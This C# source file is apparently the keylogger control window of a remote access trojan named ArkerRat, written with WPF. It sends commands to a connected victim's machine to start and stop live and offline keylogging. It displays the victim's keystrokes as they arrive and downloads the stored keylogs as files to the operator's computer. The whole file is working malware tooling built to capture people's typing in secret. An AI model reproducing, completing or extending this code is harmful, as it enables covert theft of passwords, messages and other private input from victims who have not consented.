using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for KeyLoggerWindow.xaml
    /// </summary>
    public partial class KeyLoggerWindow : Window
    {
        public static RATHostSession clientSession { get; set; }
        public KeyLoggerWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            windowText.Content += " - " + clientSession.clientInfo[0];
            keyLogger.Document.Blocks.Clear();
            keyLogger.IsReadOnly= true;
            clientSession.SendData("§KeyLoggerStart§start§KeyLoggerEnd§");
        }

        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§KeyLoggerStart§close§KeyLoggerEnd§");

            await Task.Delay(300);

            if (!clientSession.remoteDesktopWindowIsAlreadyOpen)
                GlobalVariables.byteSize = 1024;

            clientSession.keyLoggerWindowIsAlreadyOpen = false;
            close = true;

            if (startedOfflineKeylogger)
            {
                startedOfflineKeylogger = !startedOfflineKeylogger;
                DownloadFile();
                await clientSession.SendData("§KeyLoggerStart§§OFK§close§KeyLoggerEnd§");
                OfflineKeyLoggerButton.Content = "Start offline keylogger";

                //while (downloadThread==null)
                //{
                //    await Task.Delay(50);
                //}
                //downloadThread.Wait();            
            }

            Close();
        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {

        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        public void WriteKeyInputToTextBox(string key)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                keyLogger.AppendText(key);
            });
        }

        private void keyLogger_TextChanged(object sender, TextChangedEventArgs e)
        {
            keyLogger.ScrollToEnd();
        }

        bool startedLiveKeylogger = false;
        private async void LiveKeyLoggerButton_Click(object sender, RoutedEventArgs e)
        {
            startedLiveKeylogger = !startedLiveKeylogger;

            if(startedLiveKeylogger)
            {
                await clientSession.SendData("§KeyLoggerStart§§live§start§KeyLoggerEnd§");
                LiveKeyLoggerButton.Content = "Stop live keylogger";
            }
            else
            {
                await clientSession.SendData("§KeyLoggerStart§§live§close§KeyLoggerEnd§");
                LiveKeyLoggerButton.Content = "Start live keylogger";
            }
        }
        
        bool startedOfflineKeylogger = false;
        private async void OfflineKeyLoggerButton_Click(object sender, RoutedEventArgs e)
        {
            startedOfflineKeylogger = !startedOfflineKeylogger;

            if (startedOfflineKeylogger)
            {
                await clientSession.SendData("§KeyLoggerStart§§OFK§start§KeyLoggerEnd§");
                OfflineKeyLoggerButton.Content = "Stop offline keylogger";
            }
            else
            {
                DownloadFile();
                await clientSession.SendData("§KeyLoggerStart§§OFK§close§KeyLoggerEnd§");
                OfflineKeyLoggerButton.Content = "Start offline keylogger";
            }
        }



        Task downloadThread;
        string _path = string.Empty;
        public bool download = false;
        public ConcurrentQueue<string> dataBuffer = new ConcurrentQueue<string>();
        public void StartDownloadingFile()
        {
            string name = "Keylogs" + "_" + clientSession.clientInfo[0] +"_"+ Directory.EnumerateFiles(_path).Count()+".txt";
            download = true;
            using (FileStream stream = new FileStream(System.IO.Path.Combine(_path,name), FileMode.Create, FileAccess.Write))
            {
                while (!clientSession.source.IsCancellationRequested && download)
                {
                    string temp = string.Empty;
                    while (!dataBuffer.TryDequeue(out temp)) ;

                    byte[] buffer = Convert.FromBase64String(temp);
                    stream.Write(buffer, 0, buffer.Length);
                }
                stream.Close();
            }
            download = false;
        }

        private async void DownloadFile()
        {
            System.Windows.Forms.FolderBrowserDialog whereToSaveFile = new System.Windows.Forms.FolderBrowserDialog();

            whereToSaveFile.Description = "Select a folder to save the file";

            System.Windows.Forms.DialogResult result = whereToSaveFile.ShowDialog();

            if (result == System.Windows.Forms.DialogResult.OK)
            {
                _path = whereToSaveFile.SelectedPath;
                await clientSession.SendData("§KeyLoggerStart§§OFK§df§KeyLoggerEnd§");
            }
        }

        public void AddDataToBuffer(string data)
        {
            dataBuffer.Enqueue(data);
        }

        public async void IfOfflineKeyLoggerIsAlreadyActive()
        {
            startedOfflineKeylogger = !startedOfflineKeylogger;
            await clientSession.SendData("§KeyLoggerStart§§OFK§start§KeyLoggerEnd§");
            OfflineKeyLoggerButton.Content = "Stop offline keylogger";
        }
    }
}
